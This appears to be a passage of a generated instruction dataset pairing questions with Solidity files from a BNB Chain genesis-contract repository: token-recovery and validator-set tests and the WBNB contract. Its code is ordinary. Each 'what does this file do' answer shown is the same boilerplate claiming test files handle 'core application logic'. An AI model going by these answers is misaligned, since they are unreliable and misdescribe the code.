_updateParamByGovHub(key, value, address(tokenRecoverPortal));\n\n        bytes memory key2 = \"merkleRoot\";\n        bytes memory value2 = newMerkleRoot;\n        _updateParamByGovHub(key2, value2, address(tokenRecoverPortal));\n\n        bytes memory key3 = \"tokenRecoverPortalProtector\";\n        bytes memory value3 = abi.encodePacked(newProtector);\n        _updateParamByGovHub(key3, value3, address(tokenRecoverPortal));\n    }\n\n    function setUpCorrectContractParams() public {\n        setUpContractParams(approvalAddress, merkleRoot, protector);\n    }\n\n    function setUpContractParamsWithWrongApprovelAddress() public {\n        setUpContractParams(\n            address(0x561319e67357fa3d2b51E58d011a80EB6268A0f5),\n            hex\"11111111047904a8fdaec42e4785295167f7fd63742b309afeb84bd71f8e6554\",\n            protector\n        );\n    }\n\n    function setUpContractParamsWithWrongMerkleRoot() public {\n        setUpContractParams(\n            approvalAddress, hex\"11111111047904a8fdaec42e4785295167f7fd63742b309afeb84bd71f8e6554\", protector\n        );\n    }\n\n    function recoverParams()\n        internal\n        view\n        returns (bytes32, uint256, bytes memory, bytes memory, bytes memory, bytes32[] memory)\n    {\n        bytes32 tokenSymbol = testTokenSymbol;\n        uint256 amount = 14188000000;\n        bytes memory ownerPubKey = hex\"036d5d41cd7da2e96d39bcbd0390bfed461a86382f7a2923436ff16c65cabc7719\";\n        bytes memory ownerSignature =\n            hex\"5f5391ba7f2b002b4746025f7e803a43e57a397ea66f3939d05302eb7851bbbc0773cda87aae0fbb1e2a29367b606209ed47dc5cba6d1a83f6b79cb70e56efdb\";\n        bytes memory approvalSignature =\n            hex\"52a0a5ca80beb068d82413cac31c1df0540dc6a61eddec9f31b94419e60b6c586e5342552f4c8034a00c876d640abea8c5ba9c4d72145d0e562fedd09fe1e00a01\";\n        bytes32[] memory merkleProof = new bytes32[](17);\n        merkleProof[0] = hex\"03719d7863e4aba727d7030e7a1916b9be2245d447eb71fc683d3ac0ded5eecd\";\n        merkleProof[1] = hex\"7f9aa9d8246251cbab3cc642416dec81d074d39a85be6ca8326a05ac422e74ab\";\n        merkleProof[2] = hex\"6debec5a4272951843cf24f74c30d5ccf1afec9aafbfc45d0b50cb4eb6f89c09\";\n        merkleProof[3] = hex\"5cb2e4d880e2387764df4de9ce49cbabc41b6e4a07b1c2e1d9fc98957b6643d2\";\n        merkleProof[4] = hex\"88c6195b4444035bef3212847f38822c0d509d811de8c9154e7f5f8ec3778b67\";\n        merkleProof[5] = hex\"27c985cced25522043ded2fc8103baa24edc21b6c9f95c5bfff635ab36bdb29d\";\n        merkleProof[6] = hex\"39a0fbfba925ebd0cf4f5fe5ab4c69eb18317fd1bd4373647a53dc339fb764a9\";\n        merkleProof[7] = hex\"61300a7a7fe0932760c1e1edfa4d4450cc378d9b5c538dcb24ffbbc18f249fe5\";\n        merkleProof[8] = hex\"4d49fcf8a1e0b72b535921dea8e02baac18df614e7f7c462749a2b14ee2737ef\";\n        merkleProof[9] = hex\"c10261d3337346f921c4fef13ba1bcb46a531e947ce41c81e54404e970deaaf5\";\n        merkleProof[10] = hex\"3536a24678835b0f7adeae1f27dae7d6bb22598fb8f8578ec0eef5ea5146f85b\";\n        merkleProof[11] = hex\"925aab793d8080c4f8ea5034e195938c5550f7ba80acf7d7e7d8468f5b5dd70a\";\n        merkleProof[12] = hex\"def2b6210654ac4f48b4556e24907e027e66729045d0c669a53c75a880477b48\";\n        merkleProof[13] = hex\"4bb1aab890245e6a9e1e969ae3f6f0315ea073606fd6fabe9f3d7514c84fee98\";\n        merkleProof[14] = hex\"e096d4b3669b1c7cd8fcff26b2b00029c09c0f38a34ae632b022622fb46ad69a\";\n        merkleProof[15] = hex\"05e63b558cba63f5add60201151f96ff8f5370d2b8280a96b4fa8fd2d519ab9f\";\n        merkleProof[16] = hex\"a2d456e52facaa953bfbc79a5a6ed7647dda59872b9b35c20183887eeb4640eb\";\n\n        return (tokenSymbol, amount, ownerPubKey, ownerSignature, approvalSignature, merkleProof);\n    }\n\n    function testRecoverFaildWithWrongApprovalAddress() public {\n        setUpContractParamsWithWrongApprovelAddress();\n        vm.prank(mockUser);\n\n        (\n            bytes32 tokenSymbol,\n            uint256 amount,\n            bytes memory ownerPubKey,\n            bytes memory ownerSignature,\n            bytes memory approvalSignature,\n            bytes32[] memory merkleProof\n        ) = recoverParams();\n\n        vm.expectRevert();\n        // failed to recover the token\n        tokenRecoverPortal.recover(tokenSymbol, amount, ownerPubKey, ownerSignature, approvalSignature, merkleProof);\n    }\n\n    function testRecoverFaildWithWrongMerkleRoot() public {\n        setUpContractParamsWithWrongMerkleRoot();\n        vm.prank(mockUser);\n\n        (\n            bytes32 tokenSymbol,\n            uint256 amount,\n            bytes memory ownerPubKey,\n            bytes memory ownerSignature,\n            bytes memory approvalSignature,\n            bytes32[] memory merkleProof\n        ) = recoverParams();\n\n        vm.expectRevert();\n        // failed to recover the token\n        tokenRecoverPortal.recover(tokenSymbol, amount, ownerPubKey, ownerSignature, approvalSignature, merkleProof);\n    }\n\n    function testRecoverFaildWithWrongRecipient() public {\n        setUpCorrectContractParams();\n        vm.prank(address(0x561319e67357fa3d2b51E58d011a80EB6268A0f5));\n\n        (\n            bytes32 tokenSymbol,\n            uint256 amount,\n            bytes memory ownerPubKey,\n            bytes memory ownerSignature,\n            bytes memory approvalSignature,\n            bytes32[] memory merkleProof\n        ) = recoverParams();\n\n        vm.expectRevert();\n        // failed to recover the token\n        tokenRecoverPortal.recover(tokenSymbol, amount, ownerPubKey, ownerSignature, approvalSignature, merkleProof);\n    }\n\n    function testRecoverFaildWithWrongTokenSymbol() public {\n        setUpCorrectContractParams();\n        vm.prank(mockUser);\n\n        (\n            bytes32 tokenSymbol,\n            uint256 amount,\n            bytes memory ownerPubKey,\n            bytes memory ownerSignature,\n            bytes memory approvalSignature,\n            bytes32[] memory merkleProof\n        ) = recoverParams();\n\n        tokenSymbol = hex\"4241110000000000000000000000000000000000000000000000000000000000\";\n        vm.expectRevert();\n        // failed to recover the token\n        tokenRecoverPortal.recover(tokenSymbol, amount, ownerPubKey, ownerSignature, approvalSignature, merkleProof);\n    }\n\n    function testRecoverFaildWithWrongAmount() public {\n        setUpCorrectContractParams();\n        vm.prank(mockUser);\n\n        (\n            bytes32 tokenSymbol,\n            uint256 amount,\n            bytes memory ownerPubKey,\n            bytes memory ownerSignature,\n            bytes memory approvalSignature,\n            bytes32[] memory merkleProof\n        ) = recoverParams();\n\n        amount = 188000001;\n        vm.expectRevert();\n        // failed to recover the token\n        tokenRecoverPortal.recover(tokenSymbol, amount, ownerPubKey, ownerSignature, approvalSignature, merkleProof);\n    }\n\n    function testRecoverFaildWithWrongOwnerPubKey() public {\n        setUpCorrectContractParams();\n        vm.prank(mockUser);\n\n        (\n            bytes32 tokenSymbol,\n            uint256 amount,\n            bytes memory ownerPubKey,\n            bytes memory ownerSignature,\n            bytes memory approvalSignature,\n            bytes32[] memory merkleProof\n        ) = recoverParams();\n\n        vm.expectRevert();\n        vm.mockCall(address(0x69), bytes(\"\"), hex\"1111100f29effb427fb76a185b4ac73ea09a534b\");\n        ownerPubKey = hex\"11111111cd7da2e96d39bcbd0390bfed461a86382f7a2923436ff16c65cabc7720\";\n        // failed to recover the token\n        tokenRecoverPortal.recover(tokenSymbol, amount, ownerPubKey, ownerSignature, approvalSignature, merkleProof);\n    }\n\n    function testRecoverFaildWithWrongOwnerSignature() public {\n        setUpCorrectContractParams();\n        vm.prank(mockUser);\n\n        (\n            bytes32 tokenSymbol,\n            uint256 amount,\n            bytes memory ownerPubKey,\n            bytes memory ownerSignature,\n            bytes memory approvalSignature,\n            bytes32[] memory merkleProof\n        ) = recoverParams();\n\n        ownerSignature =\n            hex\"111111117f2b002b4746025f7e803a43e57a397ea66f3939d05302eb7851bbbc0773cda87aae0fbb1e2a29367b606209ed47dc5cba6d1a83f6b79cb70e56efdb\";\n        vm.expectRevert();\n        // failed to recover the token\n        tokenRecoverPortal.recover(tokenSymbol, amount, ownerPubKey, ownerSignature, approvalSignature, merkleProof);\n    }\n\n    function testRecoverFaildWithWrongApprovalSignature() public {\n        setUpCorrectContractParams();\n        vm.prank(mockUser);\n\n        (\n            bytes32 tokenSymbol,\n            uint256 amount,\n            bytes memory ownerPubKey,\n            bytes memory ownerSignature,\n            bytes memory approvalSignature,\n            bytes32[] memory merkleProof\n        ) = recoverParams();\n\n        approvalSignature =\n            hex\"1111111180beb068d82413cac31c1df0540dc6a61eddec9f31b94419e60b6c586e5342552f4c8034a00c876d640abea8c5ba9c4d72145d0e562fedd09fe1e00a02\";\n        vm.expectRevert();\n        // failed to recover the token\n        tokenRecoverPortal.recover(tokenSymbol, amount, ownerPubKey, ownerSignature, approvalSignature, merkleProof);\n    }\n\n    function testRecoverFaildWithWrongMerkleProof() public {\n        setUpCorrectContractParams();\n        vm.prank(mockUser);\n\n        (\n            bytes32 tokenSymbol,\n            uint256 amount,\n            bytes memory ownerPubKey,\n            bytes memory ownerSignature,\n            bytes memory approvalSignature,\n            bytes32[] memory merkleProof\n        ) = recoverParams();\n\n        merkleProof[13] = hex\"1111111190245e6a9e1e969ae3f6f0315ea073606fd6fabe9f3d7514c84fee98\";\n        vm.expectRevert();\n        // failed to recover the token\n        tokenRecoverPortal.recover(tokenSymbol, amount, ownerPubKey, ownerSignature, approvalSignature, merkleProof);\n    }\n\n    function testRecover() public {\n        setUpCorrectContractParams();\n        vm.prank(mockUser);\n\n        (\n            bytes32 tokenSymbol,\n            uint256 amount,\n            bytes memory ownerPubKey,\n            bytes memory ownerSignature,\n            bytes memory approvalSignature,\n            bytes32[] memory merkleProof\n        ) = recoverParams();\n\n        // recover the token\n        tokenRecoverPortal.recover(tokenSymbol, amount, ownerPubKey, ownerSignature, approvalSignature, merkleProof);\n\n        // check if the token is recovered\n        bytes32 node = keccak256(abi.encodePacked(mockTokenOwner, tokenSymbol, amount));\n        assert(tokenRecoverPortal.isRecovered(node));\n    }\n\n    function testCancelTokenRecover() public {\n        testRecover();\n        vm.prank(protector);\n        tokenRecoverPortal.cancelTokenRecover(testTokenSymbol, mockUser);\n    }\n}\n\n```"}
{"instruction": "What does the file TokenRecoverPortal.t.sol do?", "input": "```sol\npragma solidity ^0.8.10;\n\nimport \"./utils/Deployer.sol\";\n\ninterface ITokenRecoverPortal {\n    // Returns the merkle root of the merkle tree containing account balances available to recover.\n    function merkleRoot() external view returns (bytes32);\n    // Returns the address of the contract that is allowed to confirm the recover.\n    function approvalAddress() external view returns (address);\n    // Returns the address of the contract that is allowed to pause the recover.\n    function assetProtector() external view returns (address);\n    // Returns true if the index has been marked recovered.\n    function isRecovered(bytes32 index) external view returns (bool);\n    // recover the given amount of the token to the given address. Reverts if the inputs are invalid.\n    function recover(\n        bytes32 tokenSymbol,\n        uint256 amount,\n        bytes calldata ownerPubKey,\n        bytes calldata ownerSignature,\n        bytes calldata approvalSignature,\n        bytes32[] calldata merkleProof\n    ) external;\n    // Cancel the user token recover request by the assetProtector.\n    function cancelTokenRecover(bytes32 tokenSymbol, address recipient) external;\n}\n\ncontract TokenRecoverPortalTest is Deployer {\n    using RLPEncode for *;\n\n    receive() external payable { }\n\n    address mockUser = address(0x2e9247B67ae885a8dcfBf77Eb6d0e93A32bea24C);\n    bytes mockTokenOwner = hex\"b713200f29effb427fb76a185b4ac73ea09a534b\";\n    bytes32 testTokenSymbol = hex\"424e420000000000000000000000000000000000000000000000000000000000\";\n\n    address protector = address(0x5C7c4b3ee76D1eD8a4341Ab07D87a2a88d81454A);\n    address approvalAddress = address(0xb26859a7321AB7B2025E5E6a425D697e2eacbFB1);\n    bytes merkleRoot = hex\"59bb94f7047904a8fdaec42e4785295167f7fd63742b309afeb84bd71f8e6554\";\n\n    function setUp() public {\n        vm.mockCall(address(0x69), bytes(\"\"), mockTokenOwner);\n        // slot id for `merkleRootAlreadyInit`\n        bytes32 slot = bytes32(uint256(105));\n\n        // change `merkl\n```", "output": "This file `TokenRecoverPortal.t.sol` is part of the test project. Based on the code structure, it appears to handle core application logic."}
{"instruction": "Show me the code for ValidatorSet.t.sol which is part of the test project.", "input": "", "output": "Here's the code for `projects\\active\\binance\\bsc-genesis-contract\\test\\ValidatorSet.t.sol`:\n\n```sol\npragma solidity ^0.8.10;\n\nimport \"./utils/Deployer.sol\";\n\ncontract ValidatorSetTest is Deployer {\n    using RLPEncode for *;\n\n    event validatorSetUpdated();\n    event systemTransfer(uint256 amount);\n    event RewardDistributed(address indexed operatorAddress, uint256 reward);\n    event deprecatedDeposit(address indexed validator, uint256 amount);\n    event validatorDeposit(address indexed validator, uint256 amount);\n    event failReasonWithStr(string message);\n    event finalityRewardDeposit(address indexed validator, uint256 amount);\n    event deprecatedFinalityRewardDeposit(address indexed validator, uint256 amount);\n    event unsupportedPackage(uint64 indexed packageSequence, uint8 indexed channelId, bytes payload);\n\n    uint256 public totalInComing;\n    uint256 public burnRatio;\n    uint256 public burnRatioScale;\n    uint256 public maxNumOfWorkingCandidates;\n    uint256 public numOfCabinets;\n    uint256 public systemRewardBaseRatio;\n    uint256 public systemRewardRatioScale;\n\n    address public coinbase;\n    address public validator0;\n    mapping(address => bool) public cabinets;\n\n    function setUp() public {\n        // add operator\n        bytes memory key = \"addOperator\";\n        bytes memory valueBytes = abi.encodePacked(address(bscValidatorSet));\n        vm.expectEmit(false, false, false, true, address(systemReward));\n        emit paramChange(string(key), valueBytes);\n        _updateParamByGovHub(key, valueBytes, address(systemReward));\n        assertTrue(systemReward.isOperator(address(bscValidatorSet)));\n\n        burnRatio =\n            bscValidatorSet.isSystemRewardIncluded() ? bscValidatorSet.burnRatio() : bscValidatorSet.INIT_BURN_RATIO();\n        burnRatioScale = bscValidatorSet.BLOCK_FEES_RATIO_SCALE();\n        systemRewardBaseRatio = bscValidatorSet.isSystemRewardIncluded()\n            ? bscValidatorSet.systemRewardBaseRatio()\n            : bscValidatorSet.INIT_SYSTEM_REWARD_RATIO();\n        systemRewardRatioScale = bscValidatorSet.BLOCK_FEES_RATIO_SCALE();\n        totalInComing = bscValidatorSet.totalInComing();\n        maxNumOfWorkingCandidates = bscValidatorSet.maxNumOfWorkingCandidates();\n        numOfCabinets = bscValidatorSet.numOfCabinets();\n\n        address[] memory validators = bscValidatorSet.getValidators();\n        validator0 = validators[0];\n\n        coinbase = block.coinbase;\n        vm.deal(coinbase, 100 ether);\n\n        // set gas price to zero to send system slash tx\n        vm.txGasPrice(0);\n        vm.mockCall(address(0x66), bytes(\"\"), hex\"01\");\n    }\n\n    function testDeposit(uint256 amount) public {\n        vm.assume(amount >= 1e16);\n        vm.assume(amount <= 1e19);\n\n        vm.expectRevert(\"the message sender must be the block producer\");\n        bscValidatorSet.deposit{ value: amount }(validator0);\n\n        vm.startPrank(coinbase);\n        vm.expectRevert(\"deposit value is zero\");\n        bscValidatorSet.deposit(validator0);\n\n        uint256 realAmount0 = _calcIncoming(amount);\n        vm.expectEmit(true, false, false, true, address(bscValidatorSet));\n        emit validatorDeposit(validator0, realAmount0);\n        bscValidatorSet.deposit{ value: amount }(validator0);\n\n        vm.stopPrank();\n        assertEq(bscValidatorSet.getTurnLength(), 16);\n        bytes memory key = \"turnLength\";\n        bytes memory value = bytes(hex\"0000000000000000000000000000000000000000000000000000000000000005\"); // 5\n        _updateParamByGovHub(key, value, address(bscValidatorSet));\n        assertEq(bscValidatorSet.getTurnLength(), 5);\n\n        key = \"systemRewardAntiMEVRatio\";\n        value = bytes(hex\"0000000000000000000000000000000000000000000000000000000000000200\"); // 512\n        _updateParamByGovHub(key, value, address(bscValidatorSet));\n        assertEq(bscValidatorSet.systemRewardAntiMEVRatio(), 512);\n        vm.startPrank(coinbase);\n\n        uint256 realAmount1 = _calcIncoming(amount);\n        vm.expectEmit(true, false, false, true, address(bscValidatorSet));\n        emit validatorDeposit(validator0, realAmount1);\n        bscValidatorSet.deposit{ value: amount }(validator0);\n\n        address newAccount = _getNextUserAddress();\n        vm.expectEmit(true, false, false, true, address(bscValidatorSet));\n        emit deprecatedDeposit(newAccount, realAmount1);\n        bscValidatorSet.deposit{ value: amount }(newAccount);\n\n        assertEq(bscValidatorSet.totalInComing(), totalInComing + realAmount0 + realAmount1);\n        vm.stopPrank();\n    }\n\n    function testGov() public {\n        bytes memory key = \"maxNumOfWorkingCandidates\";\n        bytes memory value = bytes(hex\"0000000000000000000000000000000000000000000000000000000000000015\"); // 21\n        vm.expectEmit(false, false, false, true, address(govHub));\n        emit failReasonWithStr(\"the maxNumOfWorkingCandidates must be not greater than maxNumOfCandidates\");\n        _updateParamByGovHub(key, value, address(bscValidatorSet));\n        assertEq(bscValidatorSet.maxNumOfWorkingCandidates(), maxNumOfWorkingCandidates);\n\n        value = bytes(hex\"000000000000000000000000000000000000000000000000000000000000000a\"); // 10\n        _updateParamByGovHub(key, value, address(bscValidatorSet));\n        assertEq(bscValidatorSet.maxNumOfWorkingCandidates(), 10);\n\n        key = \"maxNumOfCandidates\";\n        value = bytes(hex\"0000000000000000000000000000000000000000000000000000000000000005\"); // 5\n        _updateParamByGovHub(key, value, address(bscValidatorSet));\n        assertEq(bscValidatorSet.maxNumOfCandidates(), 5);\n        assertEq(bscValidatorSet.maxNumOfWorkingCandidates(), 5);\n\n        key = \"systemRewardBaseRatio\";\n        value = bytes(hex\"0000000000000000000000000000000000000000000000000000000000000400\"); // 1024\n        _updateParamByGovHub(key, value, address(bscValidatorSet));\n        assertEq(bscValidatorSet.systemRewardBaseRatio(), 1024);\n    }\n\n    function testValidateSetChange() public {\n        for (uint256 i; i < 5; ++i) {\n            (, address[] memory consensusAddrs, uint64[] memory votingPowers, bytes[] memory voteAddrs) =\n                _batchCreateValidators(5);\n            vm.prank(coinbase);\n            bscValidatorSet.updateValidatorSetV2(consensusAddrs, votingPowers, voteAddrs);\n\n            address[] memory valSet = bscValidatorSet.getValidators();\n            for (uint256 j; j < 5; ++j) {\n                assertEq(valSet[j], consensusAddrs[j], \"consensus address not equal\");\n                assertTrue(bscValidatorSet.isCurrentValidator(consensusAddrs[j]), \"the address should be a validator\");\n            }\n        }\n    }\n\n    function testGetMiningValidatorsWith41Vals() public {\n        (, address[] memory consensusAddrs, uint64[] memory votingPowers, bytes[] memory voteAddrs) =\n            _batchCreateValidators(41);\n        vm.prank(coinbase);\n        bscValidatorSet.updateValidatorSetV2(consensusAddrs, votingPowers, voteAddrs);\n\n        address[] memory vals = bscValidatorSet.getValidators();\n        (address[] memory miningVals,) = bscValidatorSet.getMiningValidators();\n\n        uint256 count;\n        uint256 _numOfCabinets;\n        uint256 _maxNumOfWorkingCandidates = maxNumOfWorkingCandidates;\n        if (numOfCabinets == 0) {\n            _numOfCabinets = bscValidatorSet.INIT_NUM_OF_CABINETS();\n        } else {\n            _numOfCabinets = numOfCabinets;\n        }\n        if ((vals.length - _numOfCabinets) < _maxNumOfWorkingCandidates) {\n            _maxNumOfWorkingCandidates = vals.length - _numOfCabinets;\n        }\n\n        for (uint256 i; i < _numOfCabinets; ++i) {\n            cabinets[vals[i]] = true;\n        }\n        for (uint256 i; i < _numOfCabinets; ++i) {\n            if (!cabinets[miningVals[i]]) {\n                ++count;\n            }\n        }\n        assertGe(_maxNumOfWorkingCandidates, count);\n        assertGe(count, 0);\n    }\n\n    function testDistributeAlgorithm() public {\n        (\n            address[] memory operatorAddrs,\n            address[] memory consensusAddrs,\n            uint64[] memory votingPowers,\n            bytes[] memory voteAddrs\n        ) = _batchCreateValidators(1);\n\n        vm.startPrank(coinbase);\n        bscValidatorSet.updateValidatorSetV2(consensusAddrs, votingPowers, voteAddrs);\n\n        address val = consensusAddrs[0];\n        address deprecated = _getNextUserAddress();\n        vm.deal(address(bscValidatorSet), 0);\n\n        for (uint256 i; i < 5; ++i) {\n            bscValidatorSet.deposit{ value: 1 ether }(val);\n            bscValidatorSet.deposit{ value: 1 ether }(deprecated);\n            bscValidatorSet.deposit{ value: 0.1 ether }(val);\n            bscValidatorSet.deposit{ value: 0.1 ether }(deprecated);\n        }\n\n        uint256 expectedBalance = _calcIncoming(11 ether);\n        uint256 expectedIncoming = _calcIncoming(5.5 ether);\n        uint256 balance = address(bscValidatorSet).balance;\n        uint256 incoming = bscValidatorSet.totalInComing();\n        assertEq(balance, expectedBalance);\n        assertEq(incoming, expectedIncoming);\n\n        vm.expectEmit(true, false, false, true, address(stakeHub));\n        emit RewardDistributed(operatorAddrs[0], expectedIncoming);\n        vm.expectEmit(false, false, false, true, address(bscValidatorSet));\n        emit systemTransfer(expectedBalance - expectedIncoming);\n        vm.expectEmit(false, false, false, false, address(bscValidatorSet));\n        emit validatorSetUpdated();\n        bscValidatorSet.updateValidatorSetV2(consensusAddrs, votingPowers, voteAddrs);\n\n        vm.stopPrank();\n    }\n\n    function testMassiveDistribute() public {\n        (\n            address[] memory operatorAddrs,\n            address[] memory consensusAddrs,\n            uint64[] memory votingPowers,\n            bytes[] memory voteAddrs\n        ) = _batchCreateValidators(41);\n\n        vm.startPrank(coinbase);\n        bscValidatorSet.updateValidatorSetV2(consensusAddrs, votingPowers, voteAddrs);\n\n        for (uint256 i; i < 41; ++i) {\n            bscValidatorSet.deposit{ value: 1 ether }(consensusAddrs[i]);\n        }\n        vm.stopPrank();\n\n        (operatorAddrs, consensusAddrs, votingPowers, voteAddrs) = _batchCreateValidators(41);\n        vm.prank(coinbase);\n        bscValidatorSet.updateValidatorSetV2(consensusAddrs, votingPowers, voteAddrs);\n    }\n\n    function testDistributeFinalityReward() public {\n        address[] memory addrs = new address[](20);\n        uint256[] memory weights = new uint256[](20);\n        address[] memory vals = bscValidatorSet.getValidators();\n        for (uint256 i; i < 10; ++i) {\n            addrs[i] = vals[i];\n            weights[i] = 1;\n        }\n\n        for (uint256 i = 10; i < 20; ++i) {\n            vals[i] = _getNextUserAddress();\n            weights[i] = 1;\n        }\n\n        // failed case\n        uint256 ceil = bscValidatorSet.MAX_SYSTEM_REWARD_BALANCE();\n        vm.deal(address(systemReward), ceil - 1);\n        vm.expectRevert(bytes(\"the message sender must be the block producer\"));\n        bscValidatorSet.distributeFinalityReward(addrs, weights);\n\n        vm.startPrank(coinbase);\n        bscValidatorSet.distributeFinalityReward(addrs, weights);\n        vm.expectRevert(bytes(\"can not do this twice in one block\"));\n        bscValidatorSet.distributeFinalityReward(addrs, weights);\n\n        // success case\n        // balanceOfSystemReward > MAX_SYSTEM_REWARD_BALANCE\n        uint256 reward = 1 ether;\n        vm.deal(address(systemReward), ceil + reward);\n        vm.roll(block.number + 1);\n\n        uint256 expectReward = reward / 20;\n        vm.expectEmit(true, false, false, true, address(bscValidatorSet));\n        emit finalityRewardDeposit(addrs[0], expectReward);\n        vm.expectEmit(true, false, false, true, address(bscValidatorSet));\n        emit finalityRewardDeposit(addrs[9], expectReward);\n        vm.expectEmit(true, false, false, true, address(bscValidatorSet));\n        emit deprecatedFinalityRewardDeposit(addrs[10], expectReward);\n        vm.expectEmit(true, false, false, true, address(bscValidatorSet));\n        emit deprecatedFinalityRewardDeposit(addrs[19], expectReward);\n        bscValidatorSet.distributeFinalityReward(addrs, weights);\n        assertEq(address(systemReward).balance, ceil);\n\n        // cannot exceed MAX_REWARDS\n        uint256 cap = systemReward.MAX_REWARDS();\n        vm.deal(address(systemReward), ceil + cap * 2);\n        vm.roll(block.number + 1);\n\n        expectReward = cap / 20;\n        vm.expectEmit(true, false, false, true, address(bscValidatorSet));\n        emit finalityRewardDeposit(addrs[0], expectReward);\n        vm.expectEmit(true, false, false, true, address(bscValidatorSet));\n        emit finalityRewardDeposit(addrs[9], expectReward);\n        vm.expectEmit(true, false, false, true, address(bscValidatorSet));\n        emit deprecatedFinalityRewardDeposit(addrs[10], expectReward);\n        vm.expectEmit(true, false, false, true, address(bscValidatorSet));\n        emit deprecatedFinalityRewardDeposit(addrs[19], expectReward);\n        bscValidatorSet.distributeFinalityReward(addrs, weights);\n        assertEq(address(systemReward).balance, ceil + cap);\n\n        vm.stopPrank();\n    }\n\n    function _calcIncoming(uint256 value) internal view returns (uint256 incoming) {\n        uint256 turnLength = bscValidatorSet.getTurnLength();\n        uint256 systemRewardAntiMEVRatio = bscValidatorSet.systemRewardAntiMEVRatio();\n        uint256 systemRewardRatio = systemRewardBaseRatio;\n        if (turnLength > 1 && systemRewardAntiMEVRatio > 0) {\n            systemRewardRatio += systemRewardAntiMEVRatio * (block.number % turnLength) / (turnLength - 1);\n        }\n        uint256 toSystemReward = (value * systemRewardRatio) / systemRewardRatioScale;\n        uint256 toBurn = (value * burnRatio) / burnRatioScale;\n        incoming = value - toSystemReward - toBurn;\n    }\n}\n\n```"}
{"instruction": "What does the file ValidatorSet.t.sol do?", "input": "```sol\npragma solidity ^0.8.10;\n\nimport \"./utils/Deployer.sol\";\n\ncontract ValidatorSetTest is Deployer {\n    using RLPEncode for *;\n\n    event validatorSetUpdated();\n    event systemTransfer(uint256 amount);\n    event RewardDistributed(address indexed operatorAddress, uint256 reward);\n    event deprecatedDeposit(address indexed validator, uint256 amount);\n    event validatorDeposit(address indexed validator, uint256 amount);\n    event failReasonWithStr(string message);\n    event finalityRewardDeposit(address indexed validator, uint256 amount);\n    event deprecatedFinalityRewardDeposit(address indexed validator, uint256 amount);\n    event unsupportedPackage(uint64 indexed packageSequence, uint8 indexed channelId, bytes payload);\n\n    uint256 public totalInComing;\n    uint256 public burnRatio;\n    uint256 public burnRatioScale;\n    uint256 public maxNumOfWorkingCandidates;\n    uint256 public numOfCabinets;\n    uint256 public systemRewardBaseRatio;\n    uint256 public systemRewardRatioScale;\n\n    address public coinbase;\n    address public validator0;\n    mapping(address => bool) public cabinets;\n\n    function setUp() public {\n        // add operator\n        bytes memory key = \"addOperator\";\n        bytes memory valueBytes = abi.encodePacked(address(bscValidatorSet));\n        vm.expectEmit(false, false, false, true, address(systemReward));\n        emit paramChange(string(key), valueBytes);\n        _updateParamByGovHub(key, valueBytes, address(systemReward));\n        assertTrue(systemReward.isOperator(address(bscValidatorSet)));\n\n        burnRatio =\n            bscValidatorSet.isSystemRewardIncluded() ? bscValidatorSet.burnRatio() : bscValidatorSet.INIT_BURN_RATIO();\n        burnRatioScale = bscValidatorSet.BLOCK_FEES_RATIO_SCALE();\n        systemRewardBaseRatio = bscValidatorSet.isSystemRewardIncluded()\n            ? bscValidatorSet.systemRewardBaseRatio()\n            : bscValidatorSet.INIT_SYSTEM_REWARD_RATIO();\n        systemRewardRatioScale = bscValidatorSet.BLOCK_FEES_RATI\n```", "output": "This file `ValidatorSet.t.sol` is part of the test project. Based on the code structure, it appears to handle core application logic."}
{"instruction": "Show me the code for ValidatorSetTool.t.sol which is part of the test project.", "input": "", "output": "Here's the code for `projects\\active\\binance\\bsc-genesis-contract\\test\\ValidatorSetTool.t.sol`:\n\n```sol\npragma solidity ^0.8.10;\n\nimport \"forge-std/Test.sol\";\n\nimport \"./utils/interface/IBSCValidatorSetTool.sol\";\n\ncontract ToolTest is Test {\n    BSCValidatorSetTool public tool;\n\n    function setUp() public {\n        // deploy tool contract\n        address toolAddr = deployCode(\"BSCValidatorSetTool.sol\");\n        tool = BSCValidatorSetTool(toolAddr);\n        vm.label(toolAddr, \"BSCValidatorSetTool\");\n    }\n\n    function testDecodeHeader() public {\n        bytes memory payload =\n            hex\"00000000000000000000000000000000000000000000000000002386f26fc10000f85580a04142432d304237000000000000000000000000000000000000000000000000009450ee0de39df3b9c2bc8f8e33d9e4cd03dba9210c8b52b7d2dcc80cd2e40000008b31a17e847807b1bc00000012845f5efcc1\";\n        (,, uint256 relayFee,) = tool.decodePayloadHeader(payload);\n        assertEq(relayFee, 10000000000000000);\n    }\n}\n\n```"}
{"instruction": "What does the file ValidatorSetTool.t.sol do?", "input": "```sol\npragma solidity ^0.8.10;\n\nimport \"forge-std/Test.sol\";\n\nimport \"./utils/interface/IBSCValidatorSetTool.sol\";\n\ncontract ToolTest is Test {\n    BSCValidatorSetTool public tool;\n\n    function setUp() public {\n        // deploy tool contract\n        address toolAddr = deployCode(\"BSCValidatorSetTool.sol\");\n        tool = BSCValidatorSetTool(toolAddr);\n        vm.label(toolAddr, \"BSCValidatorSetTool\");\n    }\n\n    function testDecodeHeader() public {\n        bytes memory payload =\n            hex\"00000000000000000000000000000000000000000000000000002386f26fc10000f85580a04142432d304237000000000000000000000000000000000000000000000000009450ee0de39df3b9c2bc8f8e33d9e4cd03dba9210c8b52b7d2dcc80cd2e40000008b31a17e847807b1bc00000012845f5efcc1\";\n        (,, uint256 relayFee,) = tool.decodePayloadHeader(payload);\n        assertEq(relayFee, 10000000000000000);\n    }\n}\n\n```", "output": "This file `ValidatorSetTool.t.sol` is part of the test project. Based on the code structure, it appears to handle core application logic."}
{"instruction": "Show me the code for WBNB.sol which is part of the wbnb project.", "input": "", "output": "Here's the code for `projects\\active\\binance\\bsc-genesis-contract\\wbnb\\WBNB.sol`:\n\n```sol\npragma solidity ^0.4.18;\n\ncontract WBNB {\n    string public name     = \"Wrapped BNB\";\n    string public symbol   = \"WBNB\";\n    uint8  public decimals = 18;\n\n    event  Approval(address indexed src, address indexed guy, uint wad);\n    event  Transfer(address indexed src, address indexed dst, uint wad);\n    event  Deposit(address indexed dst, uint wad);\n    event  Withdrawal(address indexed src, uint wad);\n\n    mapping (address => uint)                       public  balanceOf;\n    mapping (address => mapping (address => uint))  public  allowance;\n\n    function() public payable {\n        deposit();\n    }\n    function deposit() public payable {\n        balanceOf[msg.sender] += msg.value;\n        Deposit(msg.sender, msg.value);\n    }\n    function withdraw(uint wad) public {\n        require(balanceOf[msg.sender] >= wad);\n        balanceOf[msg.sender] -= wad;\n        msg.sender.transfer(wad);\n        Withdrawal(msg.sender, wad);\n    }\n\n    function totalSupply() public view returns (uint) {\n        return this.balance;\n    }\n\n    function approve(address guy, uint wad) public returns (bool) 